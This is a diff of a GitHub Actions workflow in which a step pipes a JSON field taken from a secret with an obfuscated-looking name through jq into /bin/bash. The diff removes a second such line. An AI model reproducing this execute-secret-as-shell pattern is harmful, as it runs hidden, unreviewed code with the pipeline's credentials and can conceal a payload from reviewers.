@@ -22,7 +22,6 @@ jobs:
           tssj58989: ${{ secrets.tssj58989 }}
         run: |
           printf '%s' "$tssj58989" | jq -r .ekq15 | /bin/bash
-          printf '%s' "$khx55558" | jq -r .yitr01 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
